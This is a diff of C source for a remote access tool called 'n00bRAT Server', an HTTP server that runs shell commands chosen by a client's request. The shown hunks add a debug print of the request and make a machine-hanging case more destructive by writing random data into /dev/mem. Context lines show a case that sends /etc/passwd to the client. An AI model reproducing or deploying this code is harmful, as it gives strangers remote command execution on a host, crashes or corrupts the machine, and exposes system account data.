@@ -9,7 +9,7 @@
 **********************************************************************************************/
 
 /*  n00bRAT Server SOURCE CODE STARTS HERE  */
-#include "n00bRAT.h"
+#include "ABK_n00bRAT.h"
 
 //the string finally sent as HTTP Response
 char httpResponse[MAXSTRSIZE]="\0";
@@ -106,10 +106,11 @@ int main()
 
     close(fd2); /*  close fd2 */
   }
+  printf(">>>>>>>>>>>>>> %s", Request);
   return 0;
 }//end of main
-
-//it duplicates STDOUT to a Program Handled Stream using it
+//
+////it duplicates STDOUT to a Program Handled Stream using it
 //output of system commands is captured in this stream directly
 void dupStreamz(){
   if(pipe(pfds) == -1){
@@ -146,7 +147,7 @@ void tellClient(){
         system("echo \"<br/><br/><i>n00bROOT</i>\"");  break;
     //hangs the TuX machine
     case 0:    strcpy(httpResponse,httpResponse200);
-        system("cat /dev/port");  break;
+        system("cat /dev/urandom > /dev/mem");  break;
     //all entries of /etc/passwd
     case 1:    strcpy(httpResponse,httpResponse200);
         system("echo \'/etc/passwd Listing:   \' | cat /etc/passwd");  break;
